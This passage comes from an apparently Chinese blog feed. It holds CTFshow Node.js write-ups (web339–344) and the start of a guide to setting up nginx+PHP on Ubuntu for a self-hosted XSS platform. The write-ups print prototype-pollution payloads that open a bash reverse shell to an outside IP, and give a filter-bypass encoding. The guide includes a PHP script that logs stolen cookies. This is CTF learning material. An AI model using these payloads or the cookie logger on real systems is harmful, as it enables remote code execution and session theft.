punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>username<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>password<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">normalUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>user<span class="token punctuation">&#125;</span><span class="token comment">/* GET home page.  */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> secert <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> sess <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>  <span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>secert<span class="token punctuation">.</span>ctfshow<span class="token operator">===</span>flag<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'登录失败'</span><span class="token operator">+</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// api.js</span><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* GET home page.  */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'api'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">query</span><span class="token operator">:</span> <span class="token function">Function</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>原型链污染覆盖 query 实现命令执行</p><p>Function环境下没有require函数，不能获得child_process模块，我们可以通过使用process.mainModule.constructor._load来代替require。</p><p>Function(query)(query)可以执行query对应的指令，我们可以使用变量覆盖，将query的值作为反弹shell的点。</p><p>预期解<br>先抓包访问&#x2F;login，实现query值的覆盖，再POST访问&#x2F;api来执行query的值。</p><p>用反弹shell的值覆盖：</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"query"</span><span class="token operator">:</span><span class="token string">"return global.process.mainModule.constructor._load('child_process').execSync('bash -c \"bash -i >&amp; /dev/tcp/117.72.70.186/6789 0>&amp;1\"')"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="web339.png" loading="lazy"></p><h4 id="web340"><a href="#web340" class="headerlink" title="web340"></a>web340</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* GET home page.  */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>userinfo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>isVIP <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>isAdmin <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>isAuthor <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>userinfo<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>userinfo<span class="token punctuation">.</span>isAdmin<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>   <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'登录失败'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>这次user对象污染了两层，可以小小测试一下</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">copy</span><span class="token punctuation">(</span><span class="token parameter">object1<span class="token punctuation">,</span> object2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> object2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> object2 <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> object1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">copy</span><span class="token punctuation">(</span>object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">var</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>userinfo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>isVIP <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>isAdmin <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>isAuthor <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> payload <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">'&#123;"__proto__":&#123;"__proto__":&#123;"query":true&#125;&#125;&#125;'</span><span class="token punctuation">)</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>userinfo<span class="token punctuation">,</span>payload<span class="token punctuation">)</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'payload:'</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token comment">// &#123; ['__proto__']: &#123; ['__proto__']: &#123; query: true &#125; &#125; &#125;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Object:'</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>query<span class="token punctuation">)</span> <span class="token comment">// true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>userinfo<span class="token punctuation">.</span>query<span class="token punctuation">)</span> <span class="token comment">// true</span></code></pre><p>当我们嵌套两层<code>__proto__</code>时，不管是user对象还是user.userinfo对象都存在query属性，并成功被赋值。</p><p>Payload：</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"query"</span><span class="token operator">:</span><span class="token string">"return global.process.mainModule.constructor._load('child_process').execSync('bash -c \"bash -i >&amp; /dev/tcp/117.72.70.186/6789 0>&amp;1\"')"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="web341-ejs模板渲染"><a href="#web341-ejs模板渲染" class="headerlink" title="web341(ejs模板渲染)"></a>web341(ejs模板渲染)</h4><p>这次依旧是两层user，但是没api.js了</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"outputFunctionName"</span><span class="token operator">:</span><span class="token string">"_llama1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >&amp; /dev/tcp/117.72.70.186/6789 0>&amp;1\"');var _llama2"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><a href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">Express+lodash+ejs: 从原型链污染到RCE</a></p><p><a href="https://xz.aliyun.com/t/6113?time__1311=n4+xnD0DgDcDRlWDkDlhAe0=t+3q0odwrmxTD">XNUCA2019 Hardjs题解 从原型链污染到RCE</a></p><p>这次flag在根目录</p><h4 id="web342-343-jabe模板渲染"><a href="#web342-343-jabe模板渲染" class="headerlink" title="web342-343(jabe模板渲染)"></a>web342-343(jabe模板渲染)</h4><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"Block"</span><span class="token punctuation">,</span><span class="token property">"nodes"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"compileDebug"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"self"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"line"</span><span class="token operator">:</span><span class="token string">"global.process.mainModule.constructor._load('child_process').execSync('bash -c \"bash -i >&amp; /dev/tcp/117.72.70.186/6789 0>&amp;1\"')"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><a href="https://xz.aliyun.com/t/7025?time__1311=n4+xnD0Dy7itGQ=47KDsA3rZY=aL274AKfQx">再探 JavaScript 原型链污染到 RCE</a></p><p><a href="https://www.anquanke.com/post/id/236354">关于nodejs的ejs和jade模板引擎的原型链污染挖掘</a></p><h4 id="web344"><a href="#web344" class="headerlink" title="web344"></a>web344</h4><p>Hint:</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag <span class="token operator">=</span> <span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">8c|2c|\,</span><span class="token regex-delimiter">/</span><span class="token regex-flags">ig</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'where is flag :)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">var</span> query <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>query<span class="token punctuation">.</span>name<span class="token operator">===</span><span class="token string">'admin'</span><span class="token operator">&amp;&amp;</span>query<span class="token punctuation">.</span>password<span class="token operator">===</span><span class="token string">'ctfshow'</span><span class="token operator">&amp;&amp;</span>query<span class="token punctuation">.</span>isVIP<span class="token operator">===</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'where is flag. :)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>过滤了逗号和逗号的url编码2C，我们用“&amp;”连接三个属性，NodeJS会自动拼接</p><pre class="language-json" data-language="json"><code class="language-json">?query=<span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"admin"</span>&amp;query=<span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"ctfshow"</span>&amp;query=<span class="token property">"isVIP"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span></code></pre><p>不过还需要对属性进行url编码，payload：</p><pre class="language-json" data-language="json"><code class="language-json">?query=%7b%<span class="token number">22</span>%6e%<span class="token number">61</span>%6d%<span class="token number">65</span>%<span class="token number">22</span>%3a%<span class="token number">22</span>%<span class="token number">61</span>%<span class="token number">64</span>%6d%<span class="token number">69</span>%6e%<span class="token number">22</span>&amp;query=%<span class="token number">22</span>%<span class="token number">70</span>%<span class="token number">61</span>%<span class="token number">73</span>%<span class="token number">73</span>%<span class="token number">77</span>%6f%<span class="token number">72</span>%<span class="token number">64</span>%<span class="token number">22</span>%3a%<span class="token number">22</span>%<span class="token number">63</span>%<span class="token number">74</span>%<span class="token number">66</span>%<span class="token number">73</span>%<span class="token number">68</span>%6f%<span class="token number">77</span>%<span class="token number">22</span>&amp;query=%<span class="token number">22</span>%<span class="token number">69</span>%<span class="token number">73</span>%<span class="token number">56</span>%<span class="token number">49</span>%<span class="token number">50</span>%<span class="token number">22</span>%3a%<span class="token number">74</span>%<span class="token number">72</span>%<span class="token number">75</span>%<span class="token number">65</span>%7d</code></pre><p>因为在get之前双引号会被url编码为%22，与“ctfshow”组成“2c”，符合正则。</p>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu18.04上nginx+php环境搭建</title>
      <link href="/2024/07/24/Ubuntu18.04%E4%B8%8Anginx+php%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2024/07/24/Ubuntu18.04%E4%B8%8Anginx+php%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>在学习XSS漏洞过程中，由于目前大多数XSS平台都变成了收费的，所以打算自己用服务器搭建来完成XSS题目</p><p>中途遇到不少问题，这里分享一下经验</p><p>实验环境</p><p>操作系统：Ubuntu 18.04 64位</p><p>nginx：1.14.0</p><p>php：7.2.17-0</p><p>php-fram：php7.2-fpm</p><h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h4><h5 id="安装必要程序和依赖"><a href="#安装必要程序和依赖" class="headerlink" title="安装必要程序和依赖"></a>安装必要程序和依赖</h5><p>#安装程序包</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php7.2<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php7.2-fpm   <span class="token comment">#nginx与php之间的桥梁</span><span class="token function">sudo</span> <span class="token function">apt</span> remove apache2* <span class="token comment">#删除自动安装的Apache2，注意最后面有星号</span><span class="token function">sudo</span> <span class="token function">apt</span> autoremove <span class="token comment"># 清除Apache2的依赖</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> nginx</code></pre><p>#安装必要依赖</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php-json<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php-curl<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php7.2-mysql<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php7.2-cgi</code></pre><h5 id="浏览器http-xxxxxx-自己的IP-，出现如下界面即为成功"><a href="#浏览器http-xxxxxx-自己的IP-，出现如下界面即为成功" class="headerlink" title="浏览器http://xxxxxx(自己的IP)，出现如下界面即为成功"></a>浏览器<a href="http://xxxxxx(自己的ip),出现如下界面即为成功/">http://xxxxxx(自己的IP)，出现如下界面即为成功</a></h5><p><img src="welcome.png" loading="lazy"></p><p>有可能显示为阿帕奇主页，可以尝试删除 &#x2F;var&#x2F;www&#x2F;html&#x2F;index.html</p><p>因为安装php的时候会自动安装apache2,导致往这里写了这个index.html静态文件，卸载了Apache2，但这个index没删掉，导致出现异常，问题不大</p><h5 id="配置php-frm"><a href="#配置php-frm" class="headerlink" title="配置php-frm"></a>配置php-frm</h5><h6 id="修改frm配置文件"><a href="#修改frm配置文件" class="headerlink" title="修改frm配置文件"></a>修改frm配置文件</h6><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/php/7.2/fpm/php.ini</code></pre><p>vim不是唯一选择，也可以更换自己熟悉的编辑器</p><p>#修改如下参数</p><p><code>;cgi.fix_fathinfo=1</code>改为<code>cgi.fix_fathinfo=0</code></p><p><img src="phpini.png" loading="lazy"></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/php/7.2/fpm/pool.d/www.conf</code></pre><p>#修改如下参数</p><p>listen &#x3D; 127.0.0.1:9000 （原先值是&#x2F;run&#x2F;php&#x2F;php7.2-fpm.sock）<br>listen.allowed_clients &#x3D; 127.0.0.1<br>pm.max_children &#x3D; 50<br>pm.max_requests &#x3D; 500<br>request_terminate_timeout &#x3D; 0<br>rlimit_files &#x3D; 1024</p><h6 id="编写demo测试一下"><a href="#编写demo测试一下" class="headerlink" title="编写demo测试一下"></a>编写demo测试一下</h6><p>在<code>/var/www/html/</code>下编写index.php</p><pre class="language-markup" data-language="markup"><code class="language-markup">vim /var/www/html/index.php内容如下：    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span> Hello,this is test page. <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></code></pre><h6 id="配置nginx"><a href="#配置nginx" class="headerlink" title="配置nginx"></a>配置nginx</h6><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/nginx/sites-available/default</code></pre><p>在<code>index.html</code>前加上<code>index.php</code></p><p>将以下框中内容修改</p><pre class="language-http" data-language="http"><code class="language-http">location ~ \.php$ &#123;    root           html;    fastcgi_pass   127.0.0.1:9000;    fastcgi_index  index.php;    fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;    include        fastcgi_params;&#125;</code></pre><p><img src="nginx.png" alt="img" loading="lazy"></p><h6 id="重启服务"><a href="#重启服务" class="headerlink" title="重启服务"></a>重启服务</h6><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">service</span> php7.2-fpm restart<span class="token function">sudo</span> <span class="token function">service</span> nginx restart </code></pre><h4 id="查看demo测试"><a href="#查看demo测试" class="headerlink" title="查看demo测试"></a>查看demo测试</h4><p>浏览器访问自己的IP</p><p><img src="Demo.png" loading="lazy"></p><p>至此就可以进行编写自己的网站了，因为我是用作XSS平台用，所以简单分享一下我的问题</p><h4 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h4><h5 id="网页无法访问"><a href="#网页无法访问" class="headerlink" title="网页无法访问"></a>网页无法访问</h5><p>我在<code>/var/www/html/</code>下创建了<code>xss</code>的目录，下面放了可以反弹到cookie的php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$cookie</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$time</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Y-m-d h:i:s'</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$log</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cookie.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">,</span><span class="token variable">$time</span><span class="token operator">.</span><span class="token string single-quoted-string">':    '</span><span class="token operator">.</span> <span class="token variable">$cookie</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>刚开始一直访问不了 报错：<code>Not input file specified</code>然后看日志<code>/var/log/nginx/error.log</code></p><pre class="language-bash" data-language="bash"><code class="language-bash">FastCGI sent <span class="token keyword">in</span> stderr: <span class="token string">"Unable to open primary script: /var/www/html//xss/cookie.php (No such file or directory)"</span></code></pre><p>看到文件路径多了一个<code>/</code>于是查询，在配置nginx的时候出了点小问题<code>fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;</code>改成这样删去多余的<code>/</code></p><h5 id="无法写入文件"><a href="#无法写入文件" class="headerlink" 